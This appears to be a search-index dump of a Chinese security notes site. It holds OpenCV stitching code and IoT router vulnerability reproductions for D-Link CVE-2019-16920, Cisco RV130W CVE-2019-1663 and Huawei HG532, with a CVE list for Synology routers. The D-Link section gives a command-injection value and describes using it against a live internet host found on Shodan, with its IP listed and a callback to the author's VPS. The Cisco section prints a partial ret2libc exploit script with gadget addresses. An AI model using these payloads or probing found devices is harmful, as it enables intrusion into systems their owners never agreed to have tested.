#\u63d0\u53d6\u4f18\u79c0\u7684\u7279\u5f81\u70b9 for m , n in matches : if m . distance < 0.7 * n . distance : #\u5982\u679c\u7b2c\u4e00\u4e2a\u90bb\u8fd1\u8ddd\u79bb\u6bd4\u7b2c\u4e8c\u4e2a\u90bb\u8fd1\u8ddd\u79bb\u76840.7\u500d\u5c0f\uff0c\u5219\u4fdd\u7559 good . append ( m ) src_pts = np . array ([ kp1 [ m . queryIdx ] . pt for m in good ]) #\u67e5\u8be2\u56fe\u50cf\u7684\u7279\u5f81\u63cf\u8ff0\u5b50\u7d22\u5f15 dst_pts = np . array ([ kp2 [ m . trainIdx ] . pt for m in good ]) #\u8bad\u7ec3(\u6a21\u677f)\u56fe\u50cf\u7684\u7279\u5f81\u63cf\u8ff0\u5b50\u7d22\u5f15 H = cv2 . findHomography ( src_pts , dst_pts ) #\u751f\u6210\u53d8\u6362\u77e9\u9635 h , w = leftgray . shape [: 2 ] h1 , w1 = rightgray . shape [: 2 ] shft = np . array ([[ 1.0 , 0 , w ],[ 0 , 1.0 , 0 ],[ 0 , 0 , 1.0 ]]) M = np . dot ( shft , H [ 0 ]) #\u83b7\u53d6\u5de6\u8fb9\u56fe\u50cf\u5230\u53f3\u8fb9\u56fe\u50cf\u7684\u6295\u5f71\u6620\u5c04\u5173\u7cfb dst_corners = cv2 . warpPerspective ( leftgray , M ,( w * 2 , h )) #\u900f\u89c6\u53d8\u6362\uff0c\u65b0\u56fe\u50cf\u53ef\u5bb9\u7eb3\u5b8c\u6574\u7684\u4e24\u5e45\u56fe # cv2.imshow('tiledImg1',dst_corners) #\u663e\u793a\uff0c\u7b2c\u4e00\u5e45\u56fe\u5df2\u5728\u6807\u51c6\u4f4d\u7f6e dst_corners [ 0 : h , w : w * 2 ] = rightgray #\u5c06\u7b2c\u4e8c\u5e45\u56fe\u653e\u5728\u53f3\u4fa7 cv2 . imwrite ( 'tiled.jpg' , dst_corners ) cv2 . imshow ( 'tiledImg' , dst_corners ) cv2 . imshow ( 'leftgray' , leftgray ) cv2 . imshow ( 'rightgray' , rightgray ) cv2 . waitKey () cv2 . destroyAllWindows ()","title":"\u5904\u7406\u6b65\u9aa4"},{"location":"2019\u5b66\u671f/\u591a\u5a92\u4f53\u60c5\u62a5/\u591a\u5a92\u4f53\u7b2c\u4e8c\u6b21\u4f5c\u4e1a/#_3","text":"\u539f\u6765\u7684\u56fe\u7247 \u5de6\u56fe\u53d8\u6362\u540e\u7684\u7ed3\u679c \u62fc\u63a5\u540e\u7684\u56fe\u7247","title":"\u7ed3\u679c\u5206\u6790"},{"location":"2019\u5b66\u671f/\u591a\u5a92\u4f53\u60c5\u62a5/\u591a\u5a92\u4f53\u7b2c\u4e8c\u6b21\u4f5c\u4e1a/#_4","text":"\u5de6\u56fe \u53f3\u56fe \u7ed3\u679c","title":"\u6297\u5e72\u6270\u5206\u6790"},{"location":"2019\u5b66\u671f/\u591a\u5a92\u4f53\u60c5\u62a5/\u591a\u5a92\u4f53\u7b2c\u4e8c\u6b21\u4f5c\u4e1a/#_5","text":"hessian\u8c03\u6574\u62105000\u4e4b\u540e\uff0c\u7279\u5f81\u70b9\u5c06\u5927\u5927\u51cf\u5c11 \u82e5\u5c06\u5176\u8c03\u6574\u523040\uff0c\u7279\u5f81\u70b9\u8fc7\u591a","title":"\u53c2\u6570\u6027\u80fd\u5206\u6790"},{"location":"2019\u5b66\u671f/\u591a\u5a92\u4f53\u60c5\u62a5/\u591a\u5a92\u4f53\u7b2c\u4e8c\u6b21\u4f5c\u4e1a/#_6","text":"surf\u7b97\u6cd5\u539f\u7406 \u7279\u5f81\u70b9\u68c0\u6d4b\u5b66\u4e60_2 FLANN\u5339\u914d","title":"\u53c2\u8003"},{"location":"IOT/CVE-2019-16920\u590d\u73b0/","text":"CVE-2019-16920 \u590d\u73b0 \u00b6 \u590d\u73b0\u8fc7\u7a0b \u00b6 \u56fa\u4ef6\u80fd\u591f\u6210\u529f\u5730\u6a21\u62df\uff0c\u4f46\u662f\u62a5\u4e86\u4e00\u4e9b\u9519\u8bef 1 2 3 4 WARNING: Could not open /proc/net/vlan/config. Maybe you need to load the 8021q module, or maybe you are not using PROCFS?? Added VLAN with VID == 1 to IF -:tap281:- WARNING: VLAN 1 does not work with many switches, consider another number if you have problems. \u8fd9\u4e2a\u5c31\u5f88\u7384\u5b66\u4e86\uff0c\u4e8e\u662f\u3002\u3002 \u6293\u5305\u4e4b\u540e\u5c1d\u8bd5\u6784\u9020\u53d1\u5305\uff0c\u5728\u81ea\u5df1\u7684vps\u4e0a\u672a\u80fd\u76d1\u542c\u5230 \u6f0f\u6d1e\u539f\u7406\u5206\u6790 \u00b6 \u4e0d\u662f\u5f88\u7406\u89e3cgi\u4e2d\u7684\u8def\u7531\u662f\u600e\u4e48\u8f6c\u53d1\u7684 apply_sec.cgi \u7684\u4ee3\u7801\u4f4d\u4e8e /www/cgi/ssi \u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\u7684\u51fd\u6570 do_ssc \uff080x408640\uff09 \u8c03\u7528 nvram_get \u51fd\u6570\u83b7\u53d6\u5230 current_user \u548c user_username \u7684\u503c \u63a5\u4e0b\u6765\u8c03\u7528 put_querystring_env \u6765\u89e3\u6790HTTP POST\u8bf7\u6c42\u5e76\u4e14\u4fdd\u5b58\u4e86\u503c\u5230ENV\u5f53\u4e2d\uff0c\u4e4b\u540e\u8c03\u7528 query_vars(\"action\", acStack288, 0x80) \u6765\u67e5\u8be2 action \u6240\u5bf9\u5e94\u7684\u503c query_vars \u67e5\u8be2\u6210\u529f\u4f1a\u8fd4\u56de0\uff0c\u6240\u4ee5 \u73b0\u5728 $s0 \u5bc4\u5b58\u5668\u6307\u5411 SSC_OBJS \u6570\u7ec4\uff0c\u7ed3\u5408\u540e\u9762\u7684 strcmp \u64cd\u4f5c\u77e5\uff0c\u5982\u679c\u6211\u4eec\u8f93\u5165\u4e00\u4e2a\u4e0d\u5305\u542b\u5728\u5185\u7684\u503c\uff0c\u5c31\u4f1a\u8fd4\u56de\u4e00\u4e2a\u9519\u8bef \u4f46\u662f\u8fd9\u4e4b\u540e\u53d1\u73b0\u4e0d\u7ba1\u600e\u4e48\u64cd\u4f5c\u90fd\u662f\u62a5\u9519\uff0c\u5e76\u4e14\u4e5f\u627e\u4e0d\u5230\u6587\u7ae0\u4e2d\u6240\u63d0\u5230\u7684 sub_41A010 \u51fd\u6570\uff0c\u5982\u679c\u6309\u7167\u6587\u7ae0\u4e2d\u7684\u5206\u6790\uff0c\u5e94\u8be5\u662f\u5728\u6570\u7ec4\u4e2d\u53d1\u73b0\u4e86\u5982\u4e0b\u503c\uff1a \u627e\u5230\u5176\u4e2d\u6709\u4e00\u4e2a ping_test \u64cd\u4f5c\uff0c\u540c\u65f6\u6709\u4e00\u4e2a\u51fd\u6570 sub_41A010 ,\u8fd9\u4e2a\u51fd\u6570\u4ece\u53c2\u6570ping_ipaddr\u4e2d\u83b7\u53d6\u5176\u503c\u3002\u5b83\u901a\u8fc7inet_aton()\uff0cinet_ntoa()\u51fd\u6570\u5c06\u503c\u8fdb\u884c\u8f6c\u6362\uff0c\u7136\u540e\u6267\u884cping\u64cd\u4f5c\u3002 \u4f46\u662f\u8fd9\u4e2a ping \u64cd\u4f5c\u7684\u547d\u4ee4\u5e76\u6ca1\u6709\u5f88\u4ed4\u7ec6\u7684\u9a8c\u8bc1\uff0c\u5bfc\u81f4\u653b\u51fb\u8005\u53ef\u4ee5\u6ce8\u5165\u4e00\u4e2a\u6362\u884c\u7b26\uff0c \u4f8b\u5982\uff1a8.8.8.8\uff050als \u6765\u5b9e\u73b0RCE \u6f0f\u6d1e\u9a8c\u8bc1 \u00b6 sodan\u4e0a\u641c\u7d22 DIR-655 \u627e\u5230\u5176\u4e2d\u4e00\u4e2a <http://72.47.152.161:8081/> \u6293\u5305\u4e4b\u540e\u5f97\u5230 VPS\u4e0a\u5f00\u542f8888\u7aef\u53e3\u8fdb\u884c\u76d1\u542c\uff0c\u5e76\u4e14\u4fee\u6539POST\u8bf7\u6c42 \u6b64\u65f6\u53ef\u4ee5\u770b\u5230VPS\u4e0a\u5df2\u7ecf\u63a5\u6536\u5230\u4e86\u8bf7\u6c42 \u53c2\u8003 \u00b6 D-Link\u8def\u7531\u5668\u524d\u53f0\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e","title":"CVE-2019-16920 \u590d\u73b0"},{"location":"IOT/CVE-2019-16920\u590d\u73b0/#cve-2019-16920","text":"","title":"CVE-2019-16920 \u590d\u73b0"},{"location":"IOT/CVE-2019-16920\u590d\u73b0/#_1","text":"\u56fa\u4ef6\u80fd\u591f\u6210\u529f\u5730\u6a21\u62df\uff0c\u4f46\u662f\u62a5\u4e86\u4e00\u4e9b\u9519\u8bef 1 2 3 4 WARNING: Could not open /proc/net/vlan/config. Maybe you need to load the 8021q module, or maybe you are not using PROCFS?? Added VLAN with VID == 1 to IF -:tap281:- WARNING: VLAN 1 does not work with many switches, consider another number if you have problems. \u8fd9\u4e2a\u5c31\u5f88\u7384\u5b66\u4e86\uff0c\u4e8e\u662f\u3002\u3002 \u6293\u5305\u4e4b\u540e\u5c1d\u8bd5\u6784\u9020\u53d1\u5305\uff0c\u5728\u81ea\u5df1\u7684vps\u4e0a\u672a\u80fd\u76d1\u542c\u5230","title":"\u590d\u73b0\u8fc7\u7a0b"},{"location":"IOT/CVE-2019-16920\u590d\u73b0/#_2","text":"\u4e0d\u662f\u5f88\u7406\u89e3cgi\u4e2d\u7684\u8def\u7531\u662f\u600e\u4e48\u8f6c\u53d1\u7684 apply_sec.cgi \u7684\u4ee3\u7801\u4f4d\u4e8e /www/cgi/ssi \u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\u7684\u51fd\u6570 do_ssc \uff080x408640\uff09 \u8c03\u7528 nvram_get \u51fd\u6570\u83b7\u53d6\u5230 current_user \u548c user_username \u7684\u503c \u63a5\u4e0b\u6765\u8c03\u7528 put_querystring_env \u6765\u89e3\u6790HTTP POST\u8bf7\u6c42\u5e76\u4e14\u4fdd\u5b58\u4e86\u503c\u5230ENV\u5f53\u4e2d\uff0c\u4e4b\u540e\u8c03\u7528 query_vars(\"action\", acStack288, 0x80) \u6765\u67e5\u8be2 action \u6240\u5bf9\u5e94\u7684\u503c query_vars \u67e5\u8be2\u6210\u529f\u4f1a\u8fd4\u56de0\uff0c\u6240\u4ee5 \u73b0\u5728 $s0 \u5bc4\u5b58\u5668\u6307\u5411 SSC_OBJS \u6570\u7ec4\uff0c\u7ed3\u5408\u540e\u9762\u7684 strcmp \u64cd\u4f5c\u77e5\uff0c\u5982\u679c\u6211\u4eec\u8f93\u5165\u4e00\u4e2a\u4e0d\u5305\u542b\u5728\u5185\u7684\u503c\uff0c\u5c31\u4f1a\u8fd4\u56de\u4e00\u4e2a\u9519\u8bef \u4f46\u662f\u8fd9\u4e4b\u540e\u53d1\u73b0\u4e0d\u7ba1\u600e\u4e48\u64cd\u4f5c\u90fd\u662f\u62a5\u9519\uff0c\u5e76\u4e14\u4e5f\u627e\u4e0d\u5230\u6587\u7ae0\u4e2d\u6240\u63d0\u5230\u7684 sub_41A010 \u51fd\u6570\uff0c\u5982\u679c\u6309\u7167\u6587\u7ae0\u4e2d\u7684\u5206\u6790\uff0c\u5e94\u8be5\u662f\u5728\u6570\u7ec4\u4e2d\u53d1\u73b0\u4e86\u5982\u4e0b\u503c\uff1a \u627e\u5230\u5176\u4e2d\u6709\u4e00\u4e2a ping_test \u64cd\u4f5c\uff0c\u540c\u65f6\u6709\u4e00\u4e2a\u51fd\u6570 sub_41A010 ,\u8fd9\u4e2a\u51fd\u6570\u4ece\u53c2\u6570ping_ipaddr\u4e2d\u83b7\u53d6\u5176\u503c\u3002\u5b83\u901a\u8fc7inet_aton()\uff0cinet_ntoa()\u51fd\u6570\u5c06\u503c\u8fdb\u884c\u8f6c\u6362\uff0c\u7136\u540e\u6267\u884cping\u64cd\u4f5c\u3002 \u4f46\u662f\u8fd9\u4e2a ping \u64cd\u4f5c\u7684\u547d\u4ee4\u5e76\u6ca1\u6709\u5f88\u4ed4\u7ec6\u7684\u9a8c\u8bc1\uff0c\u5bfc\u81f4\u653b\u51fb\u8005\u53ef\u4ee5\u6ce8\u5165\u4e00\u4e2a\u6362\u884c\u7b26\uff0c \u4f8b\u5982\uff1a8.8.8.8\uff050als \u6765\u5b9e\u73b0RCE","title":"\u6f0f\u6d1e\u539f\u7406\u5206\u6790"},{"location":"IOT/CVE-2019-16920\u590d\u73b0/#_3","text":"sodan\u4e0a\u641c\u7d22 DIR-655 \u627e\u5230\u5176\u4e2d\u4e00\u4e2a <http://72.47.152.161:8081/> \u6293\u5305\u4e4b\u540e\u5f97\u5230 VPS\u4e0a\u5f00\u542f8888\u7aef\u53e3\u8fdb\u884c\u76d1\u542c\uff0c\u5e76\u4e14\u4fee\u6539POST\u8bf7\u6c42 \u6b64\u65f6\u53ef\u4ee5\u770b\u5230VPS\u4e0a\u5df2\u7ecf\u63a5\u6536\u5230\u4e86\u8bf7\u6c42","title":"\u6f0f\u6d1e\u9a8c\u8bc1"},{"location":"IOT/CVE-2019-16920\u590d\u73b0/#_4","text":"D-Link\u8def\u7531\u5668\u524d\u53f0\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e","title":"\u53c2\u8003"},{"location":"IOT/Cisco RV130W 1.0.3.44/","text":"Cisco RV130W 1.0.3.44 \u590d\u73b0\u8fc7\u7a0b \u00b6 \u6a21\u62df\u56fa\u4ef6 \u00b6 \u56fa\u4ef6\u4e0b\u8f7d\u5730\u5740 \u5f00\u59cb\u51c6\u5907\u56fa\u4ef6\u7684\u6a21\u62df\uff1a databaseID \u4e3a7 armel\u67b6\u6784 \u53e6\u4e00\u65b9\u9762\uff0c\u4f7f\u7528binwalk\u63d0\u53d6\u56fa\u4ef6 \u56fa\u4ef6\u6a21\u62df\u7684\u65f6\u5019\u9047\u5230\u4e86\u8fd9\u4e2a\u62a5\u9519\uff1a 1 2 3 4 5 6 7 /home/oit/tools/firmadyne [git::master *] [oit@ubuntu] [22:21] > ./scripts/inferNetwork.sh 7 Querying database for architecture... Password for user firmadyne: armel Running firmware 7: terminating after 60 secs... qemu-system-arm: -monitor unix:/tmp/qemu.7,server,nowait: Failed to bind socket: Address already in use qemu-system-arm: -monitor unix:/tmp/qemu.7,server,nowait: chardev: opening backend \"socket\" failed \u8fd9\u4e2a\u62a5\u9519\u4e4b\u524d\u4e5f\u9047\u5230\u8fc7\uff0c\u6682\u65f6\u65e0\u6cd5\u6a21\u62df\u4e86 \u8c03\u8bd5 \u00b6 \u6298\u817e\u4e86\u597d\u4e45\u7ec8\u4e8e\u628a\u73af\u5883\u641e\u597d\u4e86 qemu\u4e2d\u8fd0\u884c httpd \u670d\u52a1 \u7136\u540e gdbserver attach\u4e0a\uff0c\u5e76\u4e14\u5f00\u542f\u7aef\u53e3\u8fdb\u884c\u76d1\u542c \u4e3b\u673a\u6253\u5f00 gdb-multiarch \u7136\u540e\u8fdb\u884c\u76f8\u5173\u8bbe\u7f6e \u53d1\u9001\u8d85\u957f\u7684\u5b57\u7b26\u4e32 \u7a0b\u5e8f\u5d29\u6e83\u5566 \u4f46\u662f\u5e76\u4e0d\u80fd\u591f\u5c31\u6b64\u786e\u5b9a\u51fa\u7f13\u51b2\u533a\u7684\u957f\u5ea6 \u4e4b\u540e\u7684\u51e0\u6b21\u5c1d\u8bd5 \u00b6 \u73b0\u5728arm\u865a\u62df\u673a\u4e0a\u8fd0\u884c\u670d\u52a1\uff0c\u540c\u65f6 gdbserver attach\u4e0a\u53bb \u4e3b\u673a\u4e0a\u7528gdb\u8fde\u4e0a\u53bb \u53ef\u4ee5\u77e5\u9053libc\u52a0\u8f7d\u7684\u57fa\u5730\u5740 \u5b9a\u4f4d\u4e00\u4e0bsystem\u51fd\u6570\u7684\u5730\u5740 \u4f7f\u7528 radare2 \u5f97\u5230\u7684\u5730\u5740 \u4e4b\u540e\u67e5\u627e\u7684 gadgets \u548c\u5b89\u5168\u5ba2\u4e0a\u7684\u6587\u7ae0\u4e2d\u4e00\u6837 \u6700\u540e\u7684exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #coding=utf-8 #!/usr/bin/env python \"\"\" Exploit for Cisco RV130 stack-based buffer overflow (CVE-2019-1663). This piece of code will execute a command on the device by using ret2libc technique. \"\"\" import struct import sys import requests offset = 446 libc_base_addr = 0x76c86000 # libc\u57fa\u5730\u5740 system_offset = 0x0004d144 # system\u51fd\u6570\u7684\u5730\u5740 gadget1 = 0x00020e79 # pop {r2, r6, pc}; gadget2 = 0x00041308 # mov r0, sp; blx r2; def exploit ( ip , cmd ): buf = \"A\" * offset buf += struct . pack ( \"<L\" , libc_base_addr + gadget1 ) buf += struct . pack ( \"<L\" , libc_base_addr + system_offset ) # r2 buf += \"XXXX\" # r6 buf += struct . pack ( \"<L\" , libc_base_addr + gadget2 ) #pc buf += cmd params = { \"submit_button\" : \"login\" , \"submit_type\" : None , \u5c1d\u8bd5\u6267\u884c\u547d\u4ee4 \u7a0b\u5e8f\u5d29\u6e83\u4e86\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u6267\u884c\u5230\u76f8\u5e94\u7684\u547d\u4ee4","title":"Cisco RV130W 1.0.3.44 \u590d\u73b0\u8fc7\u7a0b"},{"location":"IOT/Cisco RV130W 1.0.3.44/#cisco-rv130w-10344","text":"","title":"Cisco RV130W 1.0.3.44 \u590d\u73b0\u8fc7\u7a0b"},{"location":"IOT/Cisco RV130W 1.0.3.44/#_1","text":"\u56fa\u4ef6\u4e0b\u8f7d\u5730\u5740 \u5f00\u59cb\u51c6\u5907\u56fa\u4ef6\u7684\u6a21\u62df\uff1a databaseID \u4e3a7 armel\u67b6\u6784 \u53e6\u4e00\u65b9\u9762\uff0c\u4f7f\u7528binwalk\u63d0\u53d6\u56fa\u4ef6 \u56fa\u4ef6\u6a21\u62df\u7684\u65f6\u5019\u9047\u5230\u4e86\u8fd9\u4e2a\u62a5\u9519\uff1a 1 2 3 4 5 6 7 /home/oit/tools/firmadyne [git::master *] [oit@ubuntu] [22:21] > ./scripts/inferNetwork.sh 7 Querying database for architecture... Password for user firmadyne: armel Running firmware 7: terminating after 60 secs... qemu-system-arm: -monitor unix:/tmp/qemu.7,server,nowait: Failed to bind socket: Address already in use qemu-system-arm: -monitor unix:/tmp/qemu.7,server,nowait: chardev: opening backend \"socket\" failed \u8fd9\u4e2a\u62a5\u9519\u4e4b\u524d\u4e5f\u9047\u5230\u8fc7\uff0c\u6682\u65f6\u65e0\u6cd5\u6a21\u62df\u4e86","title":"\u6a21\u62df\u56fa\u4ef6"},{"location":"IOT/Cisco RV130W 1.0.3.44/#_2","text":"\u6298\u817e\u4e86\u597d\u4e45\u7ec8\u4e8e\u628a\u73af\u5883\u641e\u597d\u4e86 qemu\u4e2d\u8fd0\u884c httpd \u670d\u52a1 \u7136\u540e gdbserver attach\u4e0a\uff0c\u5e76\u4e14\u5f00\u542f\u7aef\u53e3\u8fdb\u884c\u76d1\u542c \u4e3b\u673a\u6253\u5f00 gdb-multiarch \u7136\u540e\u8fdb\u884c\u76f8\u5173\u8bbe\u7f6e \u53d1\u9001\u8d85\u957f\u7684\u5b57\u7b26\u4e32 \u7a0b\u5e8f\u5d29\u6e83\u5566 \u4f46\u662f\u5e76\u4e0d\u80fd\u591f\u5c31\u6b64\u786e\u5b9a\u51fa\u7f13\u51b2\u533a\u7684\u957f\u5ea6","title":"\u8c03\u8bd5"},{"location":"IOT/Cisco RV130W 1.0.3.44/#_3","text":"\u73b0\u5728arm\u865a\u62df\u673a\u4e0a\u8fd0\u884c\u670d\u52a1\uff0c\u540c\u65f6 gdbserver attach\u4e0a\u53bb \u4e3b\u673a\u4e0a\u7528gdb\u8fde\u4e0a\u53bb \u53ef\u4ee5\u77e5\u9053libc\u52a0\u8f7d\u7684\u57fa\u5730\u5740 \u5b9a\u4f4d\u4e00\u4e0bsystem\u51fd\u6570\u7684\u5730\u5740 \u4f7f\u7528 radare2 \u5f97\u5230\u7684\u5730\u5740 \u4e4b\u540e\u67e5\u627e\u7684 gadgets \u548c\u5b89\u5168\u5ba2\u4e0a\u7684\u6587\u7ae0\u4e2d\u4e00\u6837 \u6700\u540e\u7684exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #coding=utf-8 #!/usr/bin/env python \"\"\" Exploit for Cisco RV130 stack-based buffer overflow (CVE-2019-1663). This piece of code will execute a command on the device by using ret2libc technique. \"\"\" import struct import sys import requests offset = 446 libc_base_addr = 0x76c86000 # libc\u57fa\u5730\u5740 system_offset = 0x0004d144 # system\u51fd\u6570\u7684\u5730\u5740 gadget1 = 0x00020e79 # pop {r2, r6, pc}; gadget2 = 0x00041308 # mov r0, sp; blx r2; def exploit ( ip , cmd ): buf = \"A\" * offset buf += struct . pack ( \"<L\" , libc_base_addr + gadget1 ) buf += struct . pack ( \"<L\" , libc_base_addr + system_offset ) # r2 buf += \"XXXX\" # r6 buf += struct . pack ( \"<L\" , libc_base_addr + gadget2 ) #pc buf += cmd params = { \"submit_button\" : \"login\" , \"submit_type\" : None , \u5c1d\u8bd5\u6267\u884c\u547d\u4ee4 \u7a0b\u5e8f\u5d29\u6e83\u4e86\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u6267\u884c\u5230\u76f8\u5e94\u7684\u547d\u4ee4","title":"\u4e4b\u540e\u7684\u51e0\u6b21\u5c1d\u8bd5"},{"location":"IOT/Synology router/","text":"Synology router\u76f8\u5173\u6f0f\u6d1e\u6536\u96c6 \u00b6 CVE List \u00b6 \u6807\u53f7 \u6f0f\u6d1e\u7c7b\u578b CVE-2018-8918 info.cgi \u7a0b\u5e8f\u9020\u6210XSS CVE-2018-13292 usr/syno/etc/mount.conf\u654f\u611f\u4fe1\u606f\u6cc4\u9732 CVE-2018-13290 SYNO.Core.ACL\u654f\u611f\u4fe1\u606f\u6cc4\u9732 CVE-2018-13289 SYNO.FolderSharing.List\u654f\u611f\u4fe1\u606f\u6cc4\u9732 CVE-2018-13287 synouser.conf\u654f\u611f\u6b47\u606f\u6cc4\u9732 CVE-2018-13285 ftpd \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c CVE-2017-15895 SYNO.FileStation.Extract\u76ee\u5f55\u904d\u5386\u6f0f\u6d1e\u5141\u8bb8\u5199\u5165\u4efb\u610f\u6587\u4ef6 CVE-2017-12078 EZ-Internet\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c CVE-2017-12077 SYNO.Core.PortForwarding.Rules\u89c4\u5219\u914d\u7f6e\u4e0d\u5f53\u5bfc\u81f4DDOS \u5206\u6790CVE-2017-12078 \u00b6 \u5c1d\u8bd5\u53bb\u5206\u6790 CVE-2017-12078 \u5b98\u7f51\u4e0a\u7684\u63cf\u8ff0\u662f\uff1a \u6b64\u6f0f\u6d1e\u5141\u8bb8\u8fdc\u7a0b\u901a\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u7528\u6237\u901a\u8fc7\u6613\u53d7\u653b\u51fb\u7684Synology Router Manager\uff08SRM\uff09\u7248\u672c\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002 \u4f46\u662f\u4e00\u76f4\u6ca1\u6709\u627e\u5230 Synology Router Manager \u7684\u56fa\u4ef6 \u53c2\u8003 \u00b6 CVE List","title":"Synology router\u76f8\u5173\u6f0f\u6d1e\u6536\u96c6"},{"location":"IOT/Synology router/#synology-router","text":"","title":"Synology router\u76f8\u5173\u6f0f\u6d1e\u6536\u96c6"},{"location":"IOT/Synology router/#cve-list","text":"\u6807\u53f7 \u6f0f\u6d1e\u7c7b\u578b CVE-2018-8918 info.cgi \u7a0b\u5e8f\u9020\u6210XSS CVE-2018-13292 usr/syno/etc/mount.conf\u654f\u611f\u4fe1\u606f\u6cc4\u9732 CVE-2018-13290 SYNO.Core.ACL\u654f\u611f\u4fe1\u606f\u6cc4\u9732 CVE-2018-13289 SYNO.FolderSharing.List\u654f\u611f\u4fe1\u606f\u6cc4\u9732 CVE-2018-13287 synouser.conf\u654f\u611f\u6b47\u606f\u6cc4\u9732 CVE-2018-13285 ftpd \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c CVE-2017-15895 SYNO.FileStation.Extract\u76ee\u5f55\u904d\u5386\u6f0f\u6d1e\u5141\u8bb8\u5199\u5165\u4efb\u610f\u6587\u4ef6 CVE-2017-12078 EZ-Internet\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c CVE-2017-12077 SYNO.Core.PortForwarding.Rules\u89c4\u5219\u914d\u7f6e\u4e0d\u5f53\u5bfc\u81f4DDOS","title":"CVE List"},{"location":"IOT/Synology router/#cve-2017-12078","text":"\u5c1d\u8bd5\u53bb\u5206\u6790 CVE-2017-12078 \u5b98\u7f51\u4e0a\u7684\u63cf\u8ff0\u662f\uff1a \u6b64\u6f0f\u6d1e\u5141\u8bb8\u8fdc\u7a0b\u901a\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u7528\u6237\u901a\u8fc7\u6613\u53d7\u653b\u51fb\u7684Synology Router Manager\uff08SRM\uff09\u7248\u672c\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002 \u4f46\u662f\u4e00\u76f4\u6ca1\u6709\u627e\u5230 Synology Router Manager \u7684\u56fa\u4ef6","title":"\u5206\u6790CVE-2017-12078"},{"location":"IOT/Synology router/#_1","text":"CVE List","title":"\u53c2\u8003"},{"location":"IOT/ciscoRV130W\u590d\u73b0/","text":"ciscoRV130W \u590d\u73b0 \u00b6","title":"ciscoRV130W \u590d\u73b0"},{"location":"IOT/ciscoRV130W\u590d\u73b0/#ciscorv130w","text":"","title":"ciscoRV130W \u590d\u73b0"},{"location":"IOT/ubuntu\u7684\u7f51\u7edc\u914d\u7f6e/","text":"","title":"Ubuntu\u7684\u7f51\u7edc\u914d\u7f6e"},{"location":"IOT/\u534e\u4e3a\u8def\u7531\u5668/","text":"\u534e\u4e3a\u8def\u7531\u5668Huawei HG532\u6f0f\u6d1e\u590d\u73b0\u8fc7\u7a0b \u00b6 \u6f0f\u6d1e\u5206\u6790 \u00b6 \u8fd9\u6b21\u51fa\u95ee\u9898\u7684\u70b9\u662f upnp \u7a0b\u5e8f 1 2 3 home/oit/Downloads/_router HG532e.rar-0.extracted/_HG532eV100R001C01B020_upgrade_packet.bin.extracted/squashfs-root/bin [oit@ubuntu] [18:36] > file upnp upnp: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked (uses shared libs), corrupted section header size \u662fMIPS32\u4f4d\u5927\u7aef\u683c\u5f0f UPnP \u662f\u7531\u201c\u901a\u7528\u5373\u63d2\u5373\u7528\u8bba\u575b\u201d\uff08UPnP\u2122 Forum\uff09\u63a8\u5e7f\u7684\u4e00\u5957\u7f51\u7edc\u534f\u8bae\u3002\u8be5\u534f\u8bae\u7684\u76ee\u6807\u662f\u4f7f\u5bb6\u5ead\u7f51\u7edc\uff08\u6570\u636e\u5171\u4eab\u3001\u901a\u4fe1\u548c\u5a31\u4e50\uff09\u548c\u516c\u53f8\u7f51\u7edc\u4e2d\u7684\u5404\u79cd\u8bbe\u5907\u80fd\u591f\u76f8\u4e92\u65e0\u7f1d\u8fde\u63a5\uff0c\u5e76\u7b80\u5316\u76f8\u5173\u7f51\u7edc\u7684\u5b9e\u73b0\u3002 \u4e22\u5230IDA\u4e2d\u5206\u6790 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 LOAD:004074FC la $a1, aNewstatusurl # \"NewStatusURL\" LOAD:00407500 move $a2, $zero LOAD:00407504 jalr $t9 ; ATP_XML_GetChildNodeByName LOAD:00407508 addiu $a3, $sp, 0x24 LOAD:0040750C lw $gp, 0x18($sp) LOAD:00407510 bnez $v0, loc_407564 LOAD:00407514 move $s1, $v0 LOAD:00407518 lw $v0, 0x24($sp) LOAD:0040751C nop LOAD:00407520 beqz $v0, loc_407564 LOAD:00407524 addiu $s0, $sp, 0x28 LOAD:00407528 la $t9, snprintf LOAD:0040752C lw $a3, 0x20($sp) LOAD:00407530 la $a2, aUpgGUST1Firmwa # \"upg -g -U %s -t '1 Firmware Upgrade Ima\"... LOAD:00407538 move $a0, $s0 LOAD:0040753C li $a1, 0x400 LOAD:00407540 jalr $t9 ; snprintf LOAD:00407544 sw $v0, 0x10($sp) LOAD:00407548 lw $gp, 0x18($sp) LOAD:0040754C nop OAD:00407520 beqz $v0, loc_407564 LOAD:00407524 addiu $s0, $sp, 0x28 LOAD:00407528 la $t9, snprintf LOAD:0040752C lw $a3, 0x20($sp) LOAD:00407530 la $a2, aUpgGUST1Firmwa # \"upg -g -U %s -t '1 Firmware Upgrade Ima\"... LOAD:00407538 move $a0, $s0 LOAD:0040753C li $a1, 0x400 LOAD:00407540 jalr $t9 ; snprintf LOAD:00407544 sw $v0, 0x10($sp) LOAD:00407548 lw $gp, 0x18($sp) LOAD:0040754C nop LOAD:00407550 la $t9, system #\u6267\u884csystem \u5206\u6790upnp\u63cf\u8ff0\u4fe1\u606f\u540e \u53d1\u73b0\u8be5\u8bbe\u5907\u652f\u6301\u540d\u4e3a DeviceUpgrade \u7684\u4e00\u79cd\u670d\u52a1\u7c7b\u578b \u8bbe\u5907\u53ef\u4ee5\u901a\u8fc7\u8fd9\u79cd\u670d\u52a1\u66f4\u65b0\u56fa\u4ef6 \u5177\u4f53\u8fc7\u7a0b\u662f\u5411 